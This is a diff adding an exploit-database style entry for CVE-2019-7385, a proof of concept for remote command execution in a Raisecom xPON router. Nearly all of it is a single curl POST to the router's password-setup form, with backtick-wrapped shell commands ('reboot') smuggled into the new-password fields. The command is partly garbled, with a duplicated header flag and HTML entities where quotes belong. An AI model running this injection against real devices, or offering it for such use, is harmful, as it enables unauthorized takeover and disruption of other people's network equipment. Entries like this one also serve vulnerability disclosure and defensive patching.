@@ -1,0 +1,19 @@
+# Exploit Title: Remote code execution in Raisecom xpon
+# Date: 03/03/2019
+# Exploit Author: JameelNabbo
+# Website: Ordina.nl
+# Vendor Homepage: https://www.raisecom.com
+# Software Link: https://www.raisecom.com/products/xpon
+# Version: ISCOMHT803G-U_2.0.0_140521_R4.1.47.002
+# Tested on: MacOSX
+# CVE-2019-7385
+
+POC:
+curl -i -s -k -X 'POST' \
+-H 'Origin: http://127.0.0.1&apos; -H -H 'Content-Type:
+application/x-www-form-urlencoded' -H 'User-Agent: Chrome/7.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,
+like Gecko) Chrome/65.0.3325.181 Safari/537.36' -H 'Referer: http://192.168.1.1/password.asp&apos; \
+--data-binary
+$'userMode=0&oldpass=netstat&newpass=`reboot`&confpass=`reboot`&submit-url=%2Fpassword.asp&save=Apply+Changes&csrf_token=current_cCSRF_ToKEN'
+\
+'http://192.168.1.1/boaform/formPasswordSetup&apos;
